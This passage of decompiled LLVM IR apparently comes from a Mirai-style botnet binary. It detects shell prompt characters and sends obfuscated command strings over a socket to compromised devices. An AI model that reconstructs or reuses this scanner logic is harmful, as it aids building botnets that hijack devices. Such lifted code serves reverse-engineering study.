  %v4_e8c4 = zext i8 %v3_e8c4 to i32
  store i32 %v4_e8c4, i32* %r3.global-to-local, align 4
  %v2_e8c8 = icmp ugt i8 %v3_e8c4, 61
  store i1 %v2_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c8 = icmp eq i8 %v3_e8c4, 62
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c8, label %dec_label_pc_e92c, label %bb395

bb395:                                            ; preds = %dec_label_pc_e8c0
  %v3_e8cc = icmp ugt i8 %v3_e8c4, 57
  store i1 %v3_e8cc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8cc = icmp eq i8 %v3_e8c4, 58
  store i1 %v8_e8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8cc, label %dec_label_pc_e92c, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %bb395
  %v2_e8d4 = icmp ugt i8 %v3_e8c4, 35
  store i1 %v2_e8d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8d4 = icmp eq i8 %v3_e8c4, 36
  store i1 %v7_e8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8d4, label %dec_label_pc_e92c, label %dec_label_pc_e8dc

dec_label_pc_e8dc:                                ; preds = %dec_label_pc_e8d4
  %v2_e8dc = icmp ugt i8 %v3_e8c4, 34
  store i1 %v2_e8dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e8dc = icmp eq i8 %v3_e8c4, 35
  store i1 %v7_e8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8dc, label %dec_label_pc_e92c, label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e8dc
  %v2_e8e4 = icmp ugt i8 %v3_e8c4, 36
  store i1 %v2_e8e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e4 = icmp eq i8 %v3_e8c4, 37
  store i1 %v7_e8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e4, label %dec_label_pc_e92c, label %dec_label_pc_e914.preheader

dec_label_pc_e914.preheader:                      ; preds = %dec_label_pc_e8e4
  %v3_e8e8 = add i32 %v0_e694, 28
  %v2_e8ec = add i32 %v3_e8e8, %v3_e8b0
  store i32 %v2_e8ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e914

dec_label_pc_e8f8:                                ; preds = %bb396
  %v2_e8f8 = icmp ugt i8 %v3_e91c, 35
  store i1 %v2_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f8 = icmp eq i8 %v3_e91c, 36
  store i1 %v7_e8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8f8, label %dec_label_pc_e92c, label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %dec_label_pc_e8f8
  %v2_e900 = icmp ugt i8 %v3_e91c, 34
  store i1 %v2_e900, i1* %cpsr_c.global-to-local, align 1
  %v7_e900 = icmp eq i8 %v3_e91c, 35
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e900, label %dec_label_pc_e92c, label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e900
  %v2_e908 = icmp ugt i8 %v3_e91c, 36
  store i1 %v2_e908, i1* %cpsr_c.global-to-local, align 1
  %v7_e908 = icmp eq i8 %v3_e91c, 37
  store i1 %v7_e908, i1* %cpsr_z.global-to-local, align 1
  %v1_e90c = add i32 %v0_e90c, -1
  store i32 %v1_e90c, i32* %r3.global-to-local, align 4
  br i1 %v7_e908, label %dec_label_pc_e92c, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e914.preheader, %dec_label_pc_e908
  %v0_e90c = phi i32 [ %v2_e8ec, %dec_label_pc_e914.preheader ], [ %v1_e90c, %dec_label_pc_e908 ]
  %v0_e914 = phi i32 [ %v1_e8b4, %dec_label_pc_e914.preheader ], [ %v1_e914, %dec_label_pc_e908 ]
  %v1_e914 = add i32 %v0_e914, -1
  store i32 %v1_e914, i32* %r1.global-to-local, align 4
  %v2_e914 = icmp ne i32 %v0_e914, 0
  store i1 %v2_e914, i1* %cpsr_c.global-to-local, align 1
  %v7_e914 = icmp eq i32 %v0_e914, 1
  store i1 %v7_e914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e914, label %dec_label_pc_e618.backedge.thread526, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %dec_label_pc_e914
  %v1_e91c = add i32 %v0_e90c, -2
  %v2_e91c = inttoptr i32 %v1_e91c to i8*
  %v3_e91c = load i8, i8* %v2_e91c, align 1
  %v4_e91c = zext i8 %v3_e91c to i32
  store i32 %v4_e91c, i32* %r2.global-to-local, align 4
  %v2_e920 = icmp ugt i8 %v3_e91c, 61
  store i1 %v2_e920, i1* %cpsr_c.global-to-local, align 1
  %v7_e920 = icmp eq i8 %v3_e91c, 62
  store i1 %v7_e920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e920, label %dec_label_pc_e92c, label %bb396

bb396:                                            ; preds = %dec_label_pc_e91c
  %v3_e924 = icmp ugt i8 %v3_e91c, 57
  store i1 %v3_e924, i1* %cpsr_c.global-to-local, align 1
  %v8_e924 = icmp eq i8 %v3_e91c, 58
  store i1 %v8_e924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e924, label %dec_label_pc_e92c, label %dec_label_pc_e8f8

dec_label_pc_e92c:                                ; preds = %dec_label_pc_e91c, %bb396, %dec_label_pc_e908, %dec_label_pc_e900, %dec_label_pc_e8f8, %dec_label_pc_e8e4, %dec_label_pc_e8c0, %dec_label_pc_e8dc, %dec_label_pc_e8d4, %bb395
  %v0_e930 = phi i32 [ %v1_e8b4, %dec_label_pc_e8e4 ], [ %v1_e8b4, %dec_label_pc_e8c0 ], [ %v1_e8b4, %dec_label_pc_e8dc ], [ %v1_e8b4, %dec_label_pc_e8d4 ], [ %v1_e8b4, %bb395 ], [ %v1_e914, %dec_label_pc_e8f8 ], [ %v1_e914, %dec_label_pc_e900 ], [ %v1_e914, %dec_label_pc_e908 ], [ %v1_e914, %bb396 ], [ %v1_e914, %dec_label_pc_e91c ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_e930 = add i32 %v0_e930, 1
  store i32 %v1_e930, i32* @r7, align 4
  %v1_e934 = call i32 @table_unlock_val(i32 22)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_e944 = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_e944, i32* %r0.global-to-local, align 4
  %v3_e948 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e948, i32* %r2.global-to-local, align 4
  store i32 %v3_e944, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e954 = load i32, i32* @r5, align 4
  %v1_e954 = add i32 %v0_e954, 4
  %v2_e954 = inttoptr i32 %v1_e954 to i32*
  %v3_e954 = load i32, i32* %v2_e954, align 4
  store i32 %v3_e954, i32* %r0.global-to-local, align 4
  %v4_e958 = call i32 @__libc_send(i32 %v3_e954, i32 %v3_e944, i32 %v3_e948, i32 16384)
  store i32 %v4_e958, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e968 = load i32, i32* @r5, align 4
  %v1_e968 = add i32 %v0_e968, 4
  %v2_e968 = inttoptr i32 %v1_e968 to i32*
  %v3_e968 = load i32, i32* %v2_e968, align 4
  store i32 %v3_e968, i32* %r0.global-to-local, align 4
  %v4_e96c = call i32 @__libc_send(i32 %v3_e968, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_e974 = call i32 @table_lock_val(i32 22)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_e97c = load i32, i32* @r5, align 4
  %v2_e97c = add i32 %v1_e97c, 12
  %v3_e97c = inttoptr i32 %v2_e97c to i32*
  store i32 8, i32* %v3_e97c, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e984:                                ; preds = %dec_label_pc_e694
  %v1_e984 = add i32 %v0_e694, 24
  %v2_e984 = inttoptr i32 %v1_e984 to i32*
  %v3_e984 = load i32, i32* %v2_e984, align 4
  store i32 %v3_e984, i32* %r2.global-to-local, align 4
  %v1_e988 = add i32 %v3_e984, -1
  store i32 %v1_e988, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e98c = icmp eq i32 %v1_e988, 0
  store i1 %v2_e98c, i1* %cpsr_z.global-to-local, align 1
  %tmp397 = icmp slt i32 %v1_e988, 1
  br i1 %tmp397, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e984
  %v2_e994 = add i32 %v1_e988, %v0_e694
  store i32 %v2_e994, i32* %r3.global-to-local, align 4
  %v1_e998 = add i32 %v2_e994, 28
  %v2_e998 = inttoptr i32 %v1_e998 to i8*
  %v3_e998 = load i8, i8* %v2_e998, align 1
  %v4_e998 = zext i8 %v3_e998 to i32
  store i32 %v4_e998, i32* %r3.global-to-local, align 4
  %v2_e99c = icmp ugt i8 %v3_e998, 61
  store i1 %v2_e99c, i1* %cpsr_c.global-to-local, align 1
  %v7_e99c = icmp eq i8 %v3_e998, 62
  store i1 %v7_e99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e99c, label %dec_label_pc_ea00, label %bb398

bb398:                                            ; preds = %dec_label_pc_e994
  %v3_e9a0 = icmp ugt i8 %v3_e998, 57
  store i1 %v3_e9a0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9a0 = icmp eq i8 %v3_e998, 58
  store i1 %v8_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9a0, label %dec_label_pc_ea00, label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %bb398
  %v2_e9a8 = icmp ugt i8 %v3_e998, 35
  store i1 %v2_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a8 = icmp eq i8 %v3_e998, 36
  store i1 %v7_e9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a8, label %dec_label_pc_ea00, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e9a8
  %v2_e9b0 = icmp ugt i8 %v3_e998, 34
  store i1 %v2_e9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b0 = icmp eq i8 %v3_e998, 35
  store i1 %v7_e9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b0, label %dec_label_pc_ea00, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9b0
  %v2_e9b8 = icmp ugt i8 %v3_e998, 36
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b8 = icmp eq i8 %v3_e998, 37
  store i1 %v7_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b8, label %dec_label_pc_ea00, label %dec_label_pc_e9e8.preheader

dec_label_pc_e9e8.preheader:                      ; preds = %dec_label_pc_e9b8
  %v3_e9bc = add i32 %v0_e694, 28
  %v2_e9c0 = add i32 %v3_e9bc, %v3_e984
  store i32 %v2_e9c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e9e8

dec_label_pc_e9cc:                                ; preds = %bb399
  %v2_e9cc = icmp ugt i8 %v3_e9f0, 35
  store i1 %v2_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9cc = icmp eq i8 %v3_e9f0, 36
  store i1 %v7_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9cc, label %dec_label_pc_ea00, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9cc
  %v2_e9d4 = icmp ugt i8 %v3_e9f0, 34
  store i1 %v2_e9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d4 = icmp eq i8 %v3_e9f0, 35
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %dec_label_pc_ea00, label %dec_label_pc_e9dc

dec_label_pc_e9dc:                                ; preds = %dec_label_pc_e9d4
  %v2_e9dc = icmp ugt i8 %v3_e9f0, 36
  store i1 %v2_e9dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9dc = icmp eq i8 %v3_e9f0, 37
  store i1 %v7_e9dc, i1* %cpsr_z.global-to-local, align 1
  %v1_e9e0 = add i32 %v0_e9e0, -1
  store i32 %v1_e9e0, i32* %r3.global-to-local, align 4
  br i1 %v7_e9dc, label %dec_label_pc_ea00, label %dec_label_pc_e9e8

dec_label_pc_e9e8:                                ; preds = %dec_label_pc_e9e8.preheader, %dec_label_pc_e9dc
  %v0_e9e0 = phi i32 [ %v2_e9c0, %dec_label_pc_e9e8.preheader ], [ %v1_e9e0, %dec_label_pc_e9dc ]
  %v0_e9e8 = phi i32 [ %v1_e988, %dec_label_pc_e9e8.preheader ], [ %v1_e9e8, %dec_label_pc_e9dc ]
  %v1_e9e8 = add i32 %v0_e9e8, -1
  store i32 %v1_e9e8, i32* %r1.global-to-local, align 4
  %v2_e9e8 = icmp ne i32 %v0_e9e8, 0
  store i1 %v2_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e8 = icmp eq i32 %v0_e9e8, 1
  store i1 %v7_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e8, label %dec_label_pc_e618.backedge.thread526, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9e8
  %v1_e9f0 = add i32 %v0_e9e0, -2
  %v2_e9f0 = inttoptr i32 %v1_e9f0 to i8*
  %v3_e9f0 = load i8, i8* %v2_e9f0, align 1
  %v4_e9f0 = zext i8 %v3_e9f0 to i32
  store i32 %v4_e9f0, i32* %r2.global-to-local, align 4
  %v2_e9f4 = icmp ugt i8 %v3_e9f0, 61
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i8 %v3_e9f0, 62
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_ea00, label %bb399

bb399:                                            ; preds = %dec_label_pc_e9f0
  %v3_e9f8 = icmp ugt i8 %v3_e9f0, 57
  store i1 %v3_e9f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9f8 = icmp eq i8 %v3_e9f0, 58
  store i1 %v8_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f8, label %dec_label_pc_ea00, label %dec_label_pc_e9cc

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f0, %bb399, %dec_label_pc_e9dc, %dec_label_pc_e9d4, %dec_label_pc_e9cc, %dec_label_pc_e9b8, %dec_label_pc_e994, %dec_label_pc_e9b0, %dec_label_pc_e9a8, %bb398
  %v0_ea04 = phi i32 [ %v1_e988, %dec_label_pc_e9b8 ], [ %v1_e988, %dec_label_pc_e994 ], [ %v1_e988, %dec_label_pc_e9b0 ], [ %v1_e988, %dec_label_pc_e9a8 ], [ %v1_e988, %bb398 ], [ %v1_e9e8, %dec_label_pc_e9cc ], [ %v1_e9e8, %dec_label_pc_e9d4 ], [ %v1_e9e8, %dec_label_pc_e9dc ], [ %v1_e9e8, %bb399 ], [ %v1_e9e8, %dec_label_pc_e9f0 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_ea04 = add i32 %v0_ea04, 1
  store i32 %v1_ea04, i32* @r7, align 4
  %v1_ea08 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_ea18 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_ea18, i32* %r0.global-to-local, align 4
  %v3_ea1c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ea1c, i32* %r2.global-to-local, align 4
  store i32 %v3_ea18, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ea28 = load i32, i32* @r5, align 4
  %v1_ea28 = add i32 %v0_ea28, 4
  %v2_ea28 = inttoptr i32 %v1_ea28 to i32*
  %v3_ea28 = load i32, i32* %v2_ea28, align 4
  store i32 %v3_ea28, i32* %r0.global-to-local, align 4
  %v4_ea2c = call i32 @__libc_send(i32 %v3_ea28, i32 %v3_ea18, i32 %v3_ea1c, i32 16384)
  store i32 %v4_ea2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ea3c = load i32, i32* @r5, align 4
  %v1_ea3c = add i32 %v0_ea3c, 4
  %v2_ea3c = inttoptr i32 %v1_ea3c to i32*
  %v3_ea3c = load i32, i32* %v2_ea3c, align 4
  store i32 %v3_ea3c, i32* %r0.global-to-local, align 4
  %v4_ea40 = call i32 @__libc_send(i32 %v3_ea3c, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_ea48 = call i32 @table_lock_val(i32 24)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_ea50 = load i32, i32* @r5, align 4
  %v2_ea50 = add i32 %v1_ea50, 12
  %v3_ea50 = inttoptr i32 %v2_ea50 to i32*
  store i32 7, i32* %v3_ea50, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_ea58:                                ; preds = %dec_label_pc_e694
  %v1_ea58 = add i32 %v0_e694, 24
  %v2_ea58 = inttoptr i32 %v1_ea58 to i32*
  %v3_ea58 = load i32, i32* %v2_ea58, align 4
  store i32 %v3_ea58, i32* %r2.global-to-local, align 4
  %v1_ea5c = add i32 %v3_ea58, -1
  store i32 %v1_ea5c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea60 = icmp eq i32 %v1_ea5c, 0
  store i1 %v2_ea60, i1* %cpsr_z.global-to-local, align 1
  %tmp400 = icmp slt i32 %v1_ea5c, 1
  br i1 %tmp400, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea58
  %v2_ea68 = add i32 %v1_ea5c, %v0_e694
  store i32 %v2_ea68, i32* %r3.global-to-local, align 4
  %v1_ea6c = add i32 %v2_ea68, 28
  %v2_ea6c = inttoptr i32 %v1_ea6c to i8*
  %v3_ea6c = load i8, i8* %v2_ea6c, align 1
  %v4_ea6c = zext i8 %v3_ea6c to i32
  store i32 %v4_ea6c, i32* %r3.global-to-local, align 4
  %v2_ea70 = icmp ugt i8 %v3_ea6c, 61
  store i1 %v2_ea70, i1* %cpsr_c.global-to-local, align 1
  %v7_ea70 = icmp eq i8 %v3_ea6c, 62
  store i1 %v7_ea70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea70, label %dec_label_pc_ead4, label %bb401

bb401:                                            ; preds = %dec_label_pc_ea68
  %v3_ea74 = icmp ugt i8 %v3_ea6c, 57
  store i1 %v3_ea74, i1* %cpsr_c.global-to-local, align 1
  %v8_ea74 = icmp eq i8 %v3_ea6c, 58
  store i1 %v8_ea74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea74, label %dec_label_pc_ead4, label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %bb401
  %v2_ea7c = icmp ugt i8 %v3_ea6c, 35
  store i1 %v2_ea7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea7c = icmp eq i8 %v3_ea6c, 36
  store i1 %v7_ea7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea7c, label %dec_label_pc_ead4, label %dec_label_pc_ea84

dec_label_pc_ea84:                                ; preds = %dec_label_pc_ea7c
  %v2_ea84 = icmp ugt i8 %v3_ea6c, 34
  store i1 %v2_ea84, i1* %cpsr_c.global-to-local, align 1
  %v7_ea84 = icmp eq i8 %v3_ea6c, 35
  store i1 %v7_ea84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea84, label %dec_label_pc_ead4, label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea84
  %v2_ea8c = icmp ugt i8 %v3_ea6c, 36
  store i1 %v2_ea8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea8c = icmp eq i8 %v3_ea6c, 37
  store i1 %v7_ea8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea8c, label %dec_label_pc_ead4, label %dec_label_pc_eabc.preheader

dec_label_pc_eabc.preheader:                      ; preds = %dec_label_pc_ea8c
  %v3_ea90 = add i32 %v0_e694, 28
  %v2_ea94 = add i32 %v3_ea90, %v3_ea58
  store i32 %v2_ea94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eabc

dec_label_pc_eaa0:                                ; preds = %bb402
  %v2_eaa0 = icmp ugt i8 %v3_eac4, 35
  store i1 %v2_eaa0, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa0 = icmp eq i8 %v3_eac4, 36
  store i1 %v7_eaa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaa0, label %dec_label_pc_ead4, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_eaa0
  %v2_eaa8 = icmp ugt i8 %v3_eac4, 34
  store i1 %v2_eaa8, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa8 = icmp eq i8 %v3_eac4, 35
  store i1 %v7_eaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaa8, label %dec_label_pc_ead4, label %dec_label_pc_eab0

dec_label_pc_eab0:                                ; preds = %dec_label_pc_eaa8
  %v2_eab0 = icmp ugt i8 %v3_eac4, 36
  store i1 %v2_eab0, i1* %cpsr_c.global-to-local, align 1
  %v7_eab0 = icmp eq i8 %v3_eac4, 37
  store i1 %v7_eab0, i1* %cpsr_z.global-to-local, align 1
  %v1_eab4 = add i32 %v0_eab4, -1
  store i32 %v1_eab4, i32* %r3.global-to-local, align 4
  br i1 %v7_eab0, label %dec_label_pc_ead4, label %dec_label_pc_eabc

dec_label_pc_eabc:                                ; preds = %dec_label_pc_eabc.preheader, %dec_label_pc_eab0
  %v0_eab4 = phi i32 [ %v2_ea94, %dec_label_pc_eabc.preheader ], [ %v1_eab4, %dec_label_pc_eab0 ]
  %v0_eabc = phi i32 [ %v1_ea5c, %dec_label_pc_eabc.preheader ], [ %v1_eabc, %dec_label_pc_eab0 ]
  %v1_eabc = add i32 %v0_eabc, -1
  store i32 %v1_eabc, i32* %r1.global-to-local, align 4
  %v2_eabc = icmp ne i32 %v0_eabc, 0
  store i1 %v2_eabc, i1* %cpsr_c.global-to-local, align 1
  %v7_eabc = icmp eq i32 %v0_eabc, 1
  store i1 %v7_eabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eabc, label %dec_label_pc_e618.backedge.thread526, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eabc
  %v1_eac4 = add i32 %v0_eab4, -2
  %v2_eac4 = inttoptr i32 %v1_eac4 to i8*
  %v3_eac4 = load i8, i8* %v2_eac4, align 1
  %v4_eac4 = zext i8 %v3_eac4 to i32
  store i32 %v4_eac4, i32* %r2.global-to-local, align 4
  %v2_eac8 = icmp ugt i8 %v3_eac4, 61
  store i1 %v2_eac8, i1* %cpsr_c.global-to-local, align 1
  %v7_eac8 = icmp eq i8 %v3_eac4, 62
  store i1 %v7_eac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eac8, label %dec_label_pc_ead4, label %bb402

bb402:                                            ; preds = %dec_label_pc_eac4
  %v3_eacc = icmp ugt i8 %v3_eac4, 57
  store i1 %v3_eacc, i1* %cpsr_c.global-to-local, align 1
  %v8_eacc = icmp eq i8 %v3_eac4, 58
  store i1 %v8_eacc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eacc, label %dec_label_pc_ead4, label %dec_label_pc_eaa0

dec_label_pc_ead4:                                ; preds = %dec_label_pc_eac4, %bb402, %dec_label_pc_eab0, %dec_label_pc_eaa8, %dec_label_pc_eaa0, %dec_label_pc_ea8c, %dec_label_pc_ea68, %dec_label_pc_ea84, %dec_label_pc_ea7c, %bb401
  %v0_ead8 = phi i32 [ %v1_ea5c, %dec_label_pc_ea8c ], [ %v1_ea5c, %dec_label_pc_ea68 ], [ %v1_ea5c, %dec_label_pc_ea84 ], [ %v1_ea5c, %dec_label_pc_ea7c ], [ %v1_ea5c, %bb401 ], [ %v1_eabc, %dec_label_pc_eaa0 ], [ %v1_eabc, %dec_label_pc_eaa8 ], [ %v1_eabc, %dec_label_pc_eab0 ], [ %v1_eabc, %bb402 ], [ %v1_eabc, %dec_label_pc_eac4 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_ead8 = add i32 %v0_ead8, 1
  store i32 %v1_ead8, i32* @r7, align 4
  %v1_eadc = call i32 @table_unlock_val(i32 25)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_eaec = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_eaec, i32* %r0.global-to-local, align 4
  %v3_eaf0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_eaf0, i32* %r2.global-to-local, align 4
  store i32 %v3_eaec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eafc = load i32, i32* @r5, align 4
  %v1_eafc = add i32 %v0_eafc, 4
  %v2_eafc = inttoptr i32 %v1_eafc to i32*
  %v3_eafc = load i32, i32* %v2_eafc, align 4
  store i32 %v3_eafc, i32* %r0.global-to-local, align 4
  %v4_eb00 = call i32 @__libc_send(i32 %v3_eafc, i32 %v3_eaec, i32 %v3_eaf0, i32 16384)
  store i32 %v4_eb00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eb10 = load i32, i32* @r5, align 4
  %v1_eb10 = add i32 %v0_eb10, 4
  %v2_eb10 = inttoptr i32 %v1_eb10 to i32*
  %v3_eb10 = load i32, i32* %v2_eb10, align 4
  store i32 %v3_eb10, i32* %r0.global-to-local, align 4
  %v4_eb14 = call i32 @__libc_send(i32 %v3_eb10, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_eb1c = call i32 @table_lock_val(i32 25)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_eb24 = load i32, i32* @r5, align 4
  %v2_eb24 = add i32 %v1_eb24, 12
  %v3_eb24 = inttoptr i32 %v2_eb24 to i32*
  store i32 9, i32* %v3_eb24, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_e694
  %v1_eb2c = add i32 %v0_e694, 24
  %v2_eb2c = inttoptr i32 %v1_eb2c to i32*
  %v3_eb2c = load i32, i32* %v2_eb2c, align 4
  store i32 %v3_eb2c, i32* %r2.global-to-local, align 4
  %v1_eb30 = add i32 %v3_eb2c, -1
  store i32 %v1_eb30, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb34 = icmp eq i32 %v1_eb30, 0
  store i1 %v2_eb34, i1* %cpsr_z.global-to-local, align 1
  %tmp403 = icmp slt i32 %v1_eb30, 1
  br i1 %tmp403, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_eb3c

dec_label_pc_eb3c:                                ; preds = %dec_label_pc_eb2c
  %v2_eb3c = add i32 %v1_eb30, %v0_e694
  store i32 %v2_eb3c, i32* %r3.global-to-local, align 4
  %v1_eb40 = add i32 %v2_eb3c, 28
  %v2_eb40 = inttoptr i32 %v1_eb40 to i8*
  %v3_eb40 = load i8, i8* %v2_eb40, align 1
  %v4_eb40 = zext i8 %v3_eb40 to i32
  store i32 %v4_eb40, i32* %r3.global-to-local, align 4
  %v2_eb44 = icmp ugt i8 %v3_eb40, 61
  store i1 %v2_eb44, i1* %cpsr_c.global-to-local, align 1
  %v7_eb44 = icmp eq i8 %v3_eb40, 62
  store i1 %v7_eb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb44, label %dec_label_pc_eba8, label %bb404

bb404:                                            ; preds = %dec_label_pc_eb3c
  %v3_eb48 = icmp ugt i8 %v3_eb40, 57
  store i1 %v3_eb48, i1* %cpsr_c.global-to-local, align 1
  %v8_eb48 = icmp eq i8 %v3_eb40, 58
  store i1 %v8_eb48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eb48, label %dec_label_pc_eba8, label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %bb404
  %v2_eb50 = icmp ugt i8 %v3_eb40, 35
  store i1 %v2_eb50, i1* %cpsr_c.global-to-local, align 1
  %v7_eb50 = icmp eq i8 %v3_eb40, 36
  store i1 %v7_eb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb50, label %dec_label_pc_eba8, label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb50
